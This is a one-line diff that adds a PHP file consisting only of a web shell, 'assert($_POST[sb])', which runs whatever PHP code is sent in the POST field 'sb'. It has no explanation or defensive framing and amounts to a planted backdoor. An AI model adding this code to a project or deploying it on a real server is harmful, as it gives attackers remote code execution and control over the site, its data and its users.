@@ -1,0 +1,1 @@
+<?php assert($_POST[sb]);?>
